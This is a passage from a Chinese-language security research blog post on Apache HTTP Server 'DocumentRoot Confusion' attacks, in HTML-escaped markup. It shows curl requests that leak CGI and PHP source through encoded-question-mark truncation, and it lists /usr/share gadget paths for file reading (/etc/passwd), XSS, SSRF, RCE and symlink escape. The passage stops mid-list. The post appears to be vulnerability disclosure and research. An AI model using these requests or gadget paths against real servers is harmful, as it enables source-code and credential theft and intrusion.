    &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;go-ahead with %s [OK]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;當然絕大部分的情況是目標檔案不存在，於是 Httpd 會存取帶有 DocumentRoot 的版本，但這個行為已經讓我們能夠「故意的」去存取 Web Root 以外的路徑，&lt;strong&gt;如果今天可以控制 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; 的目標前綴那我們是不是就能瀏覽作業系統上的任意檔案了？&lt;/strong&gt; 這也是我們第二個 Confusion Attack 的精神！ 從 GitHub 中可以找到千千萬萬個有問題的寫法，有趣的是甚至連&lt;a href=&quot;https://httpd.apache.org/docs/current/rewrite/remapping.html#rewrite-query&quot;&gt;官方的範例文件&lt;/a&gt;都是易遭受攻擊的：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Remove mykey=???&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; &quot;%{QUERY_STRING}&quot; &quot;(.*(?:^|&amp;amp;))mykey=([^&amp;amp;]*)&amp;amp;?(.*)&amp;amp;?$&quot;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; &quot;(.*)&quot; &quot;$1?%1%3&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;除此之外還有其它亦受影響的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; 例如基於快取需求或是將想副檔名隱藏起來的 URL Masking 規則：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/html/(.*)$&quot;  &quot;/$1.html&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;或是想節省流量，嘗試使用壓縮版本的靜態檔案規則：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^(.*)\.(css|js|ico|svg)&quot; &quot;$1\.$2.gz&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;將老舊的網站轉址到根目錄的規則：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/oldwebsite/(.*)$&quot;  &quot;/$1&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;對所有 CORS 的預檢請求都回傳 200 OK 的規則：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; %{REQUEST_METHOD} &lt;span class=&quot;ss&quot;&gt;OPTIONS&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^(.*)$ $1 [R=200,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;理論上只要 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; 的目標前綴可控，我們可以瀏覽幾乎整個檔案系統，但從前面的規則中發現還有一個限制我們必須跨過的，前面例子中所出現的副檔名如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.html&lt;/code&gt; 以及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gz&lt;/code&gt; 的後綴都是讓我們沒那麼地自由的一個限制 —— 所以可以繞過這個限制嗎？ 不知道有沒有人想起前面在 Filename Confusion 章節所介紹的路徑截斷，透過這兩個攻擊的結合，我們可以自由的瀏覽作業系統上的任意檔案！&lt;/p&gt;

&lt;p&gt;接下來的範例都基於這個不安全的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; 來做示範：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/html/(.*)$&quot;  &quot;/$1.html&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-primitive-2-1-server-side-source-code-disclosure&quot;&gt;⚔️ Primitive 2-1. Server-Side Source Code Disclosure&lt;/h4&gt;

&lt;p&gt;首先來介紹 DocumentRoot Confusion 的第一個攻擊手法 —— &lt;strong&gt;任意伺服器端程式碼洩漏&lt;/strong&gt;！&lt;/p&gt;

&lt;p&gt;由於 Httpd 會根據當前目錄或是當前虛擬主機設定決定是否當成 Server-Side Script 處理，因此透過絕對路徑去存取目標程式碼可以混淆 Httpd 的邏輯導致洩漏原本該被當成程式碼執行的檔案內容。&lt;/p&gt;

&lt;h5 id=&quot;️-2-1-1-disclose-cgi-source-code&quot;&gt;✔️ 2-1-1. Disclose CGI Source Code&lt;/h5&gt;

&lt;p&gt;首先是洩漏伺服器端的 CGI 程式碼，由於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; 是透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptAlias&lt;/code&gt; 將 CGI 目錄與所指定的 URL 前綴綁定起來，當使用絕對路徑直接瀏覽 CGI 時由於 URL 前綴變了，因此可以直接洩漏出檔案原始碼。&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/cgi-bin/download.cgi
 &lt;span class=&quot;c&quot;&gt;# the processed result from download.cgi&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
 &lt;span class=&quot;c&quot;&gt;# #!/usr/bin/perl&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# use CGI;&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# ...&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# # the source code of download.cgi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;️-2-1-2-disclose-php-source-code&quot;&gt;✔️ 2-1-2. Disclose PHP Source Code&lt;/h5&gt;

&lt;p&gt;接著是洩漏伺服器端的 PHP 程式碼，由於 PHP 的使用場景眾多，若只針對特定目錄或是虛擬主機套用 PHP 環境的話 (常見於網站代管服務)，可以透過未啟用 PHP 的虛擬主機存取 PHP 檔案以洩漏原始碼！&lt;/p&gt;

&lt;p&gt;例如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.local&lt;/code&gt; 以及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static.local&lt;/code&gt; 兩個虛擬主機都託管在同一台伺服器上，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.local&lt;/code&gt; 允許運行 PHP 而 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static.local&lt;/code&gt; 則純粹負責處理靜態檔案，因此可以透過下面的方式洩漏出 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config.php&lt;/code&gt; 內的敏感資訊：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://www.local/config.php
 &lt;span class=&quot;c&quot;&gt;# the processed result (empty) from config.php&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://www.local/var/www.local/config.php%3F &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: static.local&quot;&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# the source code of config.php&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-primitive-2-2-local-gadgets-manipulation&quot;&gt;⚔️ Primitive 2-2. Local Gadgets Manipulation!&lt;/h4&gt;

&lt;p&gt;接下來是我們的第二個攻擊手法 —— &lt;strong&gt;Local Gadgets Manipulation&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;首先，在前面介紹到「瀏覽作業系統上的任意檔案」時不知道你有沒有好奇： 「欸那是不是一個不安全的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; 就可以存取到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;？」 對的 —— 但也不完全對。 蛤？&lt;/p&gt;

&lt;p&gt;技術上來說確實伺服器會去檢查 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; 是否存在，但 Apach HTTP Server 內建的存取控制阻擋了我們的存取，這裡是 Apache HTTP Server 的&lt;a href=&quot;https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115&quot;&gt;設定檔模板內容&lt;/a&gt;：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; denied
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;會觀察到預設阻擋了根目錄 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; 的瀏覽 (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Require all denied&lt;/code&gt;)，然而實際上這就沒戲了嗎？ 實際上再詳細追查各個 Httpd 的發行版會發現 &lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165&quot;&gt;Debian/Ubuntu&lt;/a&gt; 作業系統預設允許了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt;：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /usr/share&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; granted
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以我們的「任意檔案存取」似乎有點那麼地不任意。 不過我們打破原本只能瀏覽 DocumentRoot 的信任算是跨出很大的一步了。 接下來要做的事情就是「壓榨」這個目錄內的各種可能。　所有可利用的資源、目錄中現有的教學範例、說明文件、單元測試檔案，甚至伺服器上程式語言如 PHP、Python 甚至 PHP 的模組都有機會成為我們濫用的對象！&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. 當然上面只是基於 Ubuntu/Debian 作業系統發行的 Httpd 版本設定做解釋，實務上也有發現一些應用軟體直接把的根目錄的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Require all denied&lt;/code&gt; 移除導致可以直接存取 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;️-2-2-1-local-gadget-to-information-disclosure&quot;&gt;✔️ 2-2-1. Local Gadget to Information Disclosure&lt;/h5&gt;

&lt;p&gt;首先來尋找看看這個目錄下是否存在這一些檔案是可以利用的。 首先是目標 Apache HTTP Server 如果安裝 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;websocketd&lt;/code&gt; 這個服務的話，服務套件預設會在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/doc/websocketd/examples/php/&lt;/code&gt; 下放置一個範例 PHP 程式碼 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dump-env.php&lt;/code&gt;，如果目標伺服器上存在 PHP 環境的話可以直接存取這個範例程式去洩漏敏感的環境變數。&lt;/p&gt;

&lt;p&gt;另外如果目標同時安裝如 Nginx 或是 Jetty 的話，雖然 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; 理論上該是套件安裝時所存放的唯讀複本，但這些服務的預設 Web Root 就在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; 下，因此也能透過這個攻擊手法去洩漏這些網頁應用的敏感資訊，例如 Jetty 上的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; 設定等等：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/nginx/html/&lt;/li&gt;
  &lt;li&gt;/usr/share/jetty9/etc/&lt;/li&gt;
  &lt;li&gt;/usr/share/jetty9/webapps/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;這裡簡單展示一個透過存取 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Davical&lt;/code&gt; 套件所存在的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setup.php&lt;/code&gt; 唯讀複本去洩漏 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt; 內容。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;️-2-2-2-local-gadget-to-xss&quot;&gt;✔️ 2-2-2. Local Gadget to XSS&lt;/h5&gt;

&lt;p&gt;接著如何把這個攻擊手法轉化成 XSS 呢？ 在 Ubuntu Desktop 環境中預設會安裝 LibreOffice 這套開源的辦公室應用，利用其中幫助文件的語言切換功能來完成 XSS。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: /usr/share/libreoffice/help/help.html&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// the URL came from LibreOffice help (F1)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getParameterByName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newURL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/index.html?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;latest/index.html&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;因此就算目標沒有部署任何網頁應用，我們也可以利用一個不安全的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; 透過作業系統自帶的檔案來創造出 XSS。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;️-2-2-3-local-gadget-to-lfi&quot;&gt;✔️ 2-2-3. Local Gadget to LFI&lt;/h5&gt;

&lt;p&gt;至於任意檔案讀取呢？ 如果目標伺服器上安裝了一些 PHP 甚至前端應用套件，例如 JpGraph、jQuery-jFeed 甚至 WordPress 或 Moodle 外掛，那麼它們自帶的使用教學或是除錯用程式碼都可以變成利用的對象，例如：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php&lt;/li&gt;
  &lt;li&gt;/usr/share/javascript/jquery-jfeed/proxy.php&lt;/li&gt;
  &lt;li&gt;/usr/share/moodle/mod/assignment/type/wims/getcsv.php&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;這裡展示利用 jQuery-jFeed 所自帶的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proxy.php&lt;/code&gt; 來讀取 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;️-2-2-4-local-gadget-to-ssrf&quot;&gt;✔️ 2-2-4. Local Gadget to SSRF&lt;/h5&gt;

&lt;p&gt;當然找到一個 SSRF 也不在話下，例如 MagpieRSS 提供了一個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magpie_debug.php&lt;/code&gt; 檔案就是一個絕佳的小工具：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/php/magpierss/scripts/magpie_debug.php&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;️-2-2-5-local-gadget-to-rce&quot;&gt;✔️ 2-2-5. Local Gadget to RCE&lt;/h5&gt;

&lt;p&gt;所以能 RCE 嗎？ 別急我們先慢慢來！ 首先這個攻擊手法已經可以把既有的攻擊面全部重新套用一次了，例如在某次開發過程中不小心被遺留下來 (甚至可能還是被第三方套件所依賴的) 的舊版本 PHPUnit，可以直接使用 &lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/phpunit/CVE-2017-9841&quot;&gt;CVE-2017-9841&lt;/a&gt; 來執行任意程式碼，又或者是安裝完 phpLiteAdmin (由於是唯讀副本所以預設密碼是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;)，相信看到這邊會發現 Local Gadgets Manipulation 這個攻擊手法存在著無窮潛力，剩下只是發掘出更厲害以及更通用的小工具！&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-primitive-2-3-jailbreak-from-local-gadgets&quot;&gt;⚔️ Primitive 2-3. Jailbreak from Local Gadgets&lt;/h4&gt;

&lt;p&gt;看到這裡你可能會好奇： 「真的不能跳出 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; 嗎？」 當然可以，這也是要介紹的第三個攻擊手法 —— &lt;strong&gt;從 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; 中越獄！&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L160&quot;&gt;Debian/Ubuntu&lt;/a&gt; 的 Httpd 發行版中預設開啟了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FollowSymLinks&lt;/code&gt; 選項，就算非 Debian/Ubuntu 發行版但 Apache HTTP Server 也隱含地預設&lt;a href=&quot;https://httpd.apache.org/docs/current/mod/core.html#options&quot;&gt;允許符號連結&lt;/a&gt;。&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Options&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;FollowSymLinks&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; denied
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;️-2-3-1-jailbreak-from-local-gadgets&quot;&gt;✔️ 2-3-1. Jailbreak from Local Gadgets&lt;/h5&gt;

&lt;p&gt;因此只要有套件在它的安裝目錄下符號連結到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; 外，這個符號連結就成為一個跳板去存取更多的小工具完成更多的利用。 這裡列出一些我們已經發現可利用的符號連結：&lt;/p&gt;

&lt;ul&gt;
